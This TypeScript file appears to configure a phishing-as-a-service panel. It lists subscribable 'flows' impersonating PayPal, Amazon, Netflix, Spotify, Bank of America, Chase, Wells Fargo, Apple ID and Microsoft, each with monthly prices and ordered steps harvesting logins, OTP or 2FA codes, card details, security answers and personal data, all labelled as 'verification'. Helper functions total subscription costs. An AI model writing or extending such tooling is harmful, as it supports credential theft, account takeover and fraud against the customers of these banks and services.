/**
 * Flow Configuration Service
 * Manages available flows (brands) and user subscriptions
 */

export interface FlowConfig {
    id: string;
    name: string;
    category: 'payments' | 'streaming' | 'banking' | 'ecommerce' | 'tech';
    icon: string;           // Emoji or icon class
    logo?: string;          // Logo URL
    color: string;          // Brand primary color
    monthlyPrice: number;   // Price in USD
    description: string;
    steps: FlowStep[];
    popular?: boolean;
}

export interface FlowStep {
    id: string;
    name: string;
    type: 'login' | 'otp' | 'card' | 'personal' | 'security' | 'verification' | 'email' | 'phone';
    required: boolean;
    order: number;
    config?: Record<string, any>;
}

export interface UserFlowSubscription {
    flowId: string;
    enabled: boolean;
    enabledAt?: number;
    sessionsThisMonth: number;
}

// Available flows with configurations
export const AVAILABLE_FLOWS: FlowConfig[] = [
    {
        id: 'paypal',
        name: 'PayPal',
        category: 'payments',
        icon: '💳',
        color: '#003087',
        monthlyPrice: 0,
        description: 'Payment verification flow',
        popular: true,
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
            { id: 'card', name: 'Card Details', type: 'card', required: false, order: 3 },
            { id: 'personal', name: 'Personal Info', type: 'personal', required: false, order: 4 }
        ]
    },
    {
        id: 'amazon',
        name: 'Amazon',
        category: 'ecommerce',
        icon: '📦',
        color: '#ff9900',
        monthlyPrice: 15,
        description: 'E-commerce account verification',
        popular: true,
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
            { id: 'card', name: 'Payment Method', type: 'card', required: false, order: 3 },
            { id: 'address', name: 'Address Verification', type: 'personal', required: false, order: 4 }
        ]
    },
    {
        id: 'netflix',
        name: 'Netflix',
        category: 'streaming',
        icon: '🎬',
        color: '#e50914',
        monthlyPrice: 10,
        description: 'Streaming account verification',
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'card', name: 'Payment Update', type: 'card', required: true, order: 2 },
            { id: 'email', name: 'Email Verification', type: 'email', required: false, order: 3 }
        ]
    },
    {
        id: 'spotify',
        name: 'Spotify',
        category: 'streaming',
        icon: '🎵',
        color: '#1db954',
        monthlyPrice: 10,
        description: 'Music streaming verification',
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'card', name: 'Payment Method', type: 'card', required: true, order: 2 }
        ]
    },
    {
        id: 'prime',
        name: 'Prime Video',
        category: 'streaming',
        icon: '📺',
        color: '#00a8e1',
        monthlyPrice: 10,
        description: 'Prime Video verification',
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 2 },
            { id: 'card', name: 'Payment Update', type: 'card', required: false, order: 3 }
        ]
    },
    {
        id: 'bankofamerica',
        name: 'Bank of America',
        category: 'banking',
        icon: '🏦',
        color: '#012169',
        monthlyPrice: 25,
        description: 'Banking verification flow',
        popular: true,
        steps: [
            { id: 'login', name: 'Online Banking Login', type: 'login', required: true, order: 1 },
            { id: 'security', name: 'Security Questions', type: 'security', required: true, order: 2 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 },
            { id: 'card', name: 'Card Verification', type: 'card', required: false, order: 4 },
            { id: 'personal', name: 'Identity Verification', type: 'personal', required: false, order: 5 }
        ]
    },
    {
        id: 'chase',
        name: 'Chase',
        category: 'banking',
        icon: '🏛️',
        color: '#117aca',
        monthlyPrice: 25,
        description: 'Chase banking verification',
        popular: true,
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'security', name: 'Security Verification', type: 'security', required: true, order: 2 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 },
            { id: 'card', name: 'Card Details', type: 'card', required: false, order: 4 }
        ]
    },
    {
        id: 'wellsfargo',
        name: 'Wells Fargo',
        category: 'banking',
        icon: '🔴',
        color: '#d71e28',
        monthlyPrice: 25,
        description: 'Wells Fargo banking flow',
        steps: [
            { id: 'login', name: 'Login', type: 'login', required: true, order: 1 },
            { id: 'security', name: 'Security Questions', type: 'security', required: true, order: 2 },
            { id: 'otp', name: 'OTP Verification', type: 'otp', required: true, order: 3 }
        ]
    },
    {
        id: 'apple',
        name: 'Apple ID',
        category: 'tech',
        icon: '🍎',
        color: '#a2aaad',
        monthlyPrice: 20,
        description: 'Apple ID verification',
        steps: [
            { id: 'login', name: 'Apple ID Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: '2FA Verification', type: 'otp', required: true, order: 2 },
            { id: 'card', name: 'Payment Method', type: 'card', required: false, order: 3 },
            { id: 'phone', name: 'Phone Verification', type: 'phone', required: false, order: 4 }
        ]
    },
    {
        id: 'microsoft',
        name: 'Microsoft',
        category: 'tech',
        icon: '🪟',
        color: '#00a4ef',
        monthlyPrice: 20,
        description: 'Microsoft account verification',
        steps: [
            { id: 'login', name: 'Microsoft Login', type: 'login', required: true, order: 1 },
            { id: 'otp', name: 'Authenticator Code', type: 'otp', required: true, order: 2 },
            { id: 'email', name: 'Email Verification', type: 'email', required: false, order: 3 }
        ]
    }
];

// Category labels and icons
export const FLOW_CATEGORIES = {
    payments: { label: 'Payments', icon: '💳' },
    streaming: { label: 'Streaming', icon: '🎬' },
    banking: { label: 'Banking', icon: '🏦' },
    ecommerce: { label: 'E-commerce', icon: '🛒' },
    tech: { label: 'Tech', icon: '💻' }
};

// Helper functions
export function getFlowById(id: string): FlowConfig | undefined {
    return AVAILABLE_FLOWS.find(f => f.id === id);
}

export function getFlowsByCategory(category: string): FlowConfig[] {
    return AVAILABLE_FLOWS.filter(f => f.category === category);
}

export function calculateTotalPrice(enabledFlowIds: string[]): number {
    return enabledFlowIds.reduce((total, id) => {
        const flow = getFlowById(id);
        return total + (flow?.monthlyPrice || 0);
    }, 0);
}

export function getPopularFlows(): FlowConfig[] {
    return AVAILABLE_FLOWS.filter(f => f.popular);
}

export function getAllCategories(): string[] {
    return [...new Set(AVAILABLE_FLOWS.map(f => f.category))];
}
